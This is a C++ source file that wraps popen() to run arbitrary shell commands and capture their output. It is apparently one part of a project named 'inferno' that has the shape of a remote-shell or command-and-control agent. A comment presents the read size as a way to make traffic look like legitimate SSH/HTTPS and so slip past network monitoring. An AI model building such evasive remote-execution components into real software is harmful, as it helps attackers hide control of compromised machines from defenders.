#include "../include/ShellExecutor.hpp"
#include <array>
#include <cstdio>
#include <stdexcept>

namespace inferno {

ShellExecutor::Result ShellExecutor::execute(const std::string& command) const {
    Result result;
    result.success = false;

    // Redirect stderr to stdout so we capture all output in one stream
    const std::string full_cmd = command + " 2>&1";

    // popen() creates a pipe, forks a shell process, and returns a FILE* handle.
    // NOTE: popen() internally calls fork() inside libc — this is not our code
    // calling fork() and is acceptable within the project constraints.
    // TODO(Circle 7 - Violence): Replace with non-blocking pipe + select() integration
    //   to prevent the event loop from blocking on long-running commands.
    FILE* pipe = ::popen(full_cmd.c_str(), "r");
    if (!pipe) {
        result.output = "[ShellExecutor] Error: popen() failed to launch command.";
        return result;
    }

    // Read output in CHUNK_SIZE-byte increments (4096 = system page size).
    // This matches the default libc I/O buffer, making traffic indistinguishable
    // from legitimate SSH/HTTPS streams at the network layer.
    std::array<char, CHUNK_SIZE> buffer;
    while (::fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
        result.output += buffer.data();
    }

    // pclose() waits for the child process and returns its exit status.
    const int exit_code = ::pclose(pipe);
    result.success = (exit_code == 0);

    if (result.output.empty()) {
        result.output = "[ShellExecutor] Command produced no output.";
    }

    return result;
}

} // namespace inferno
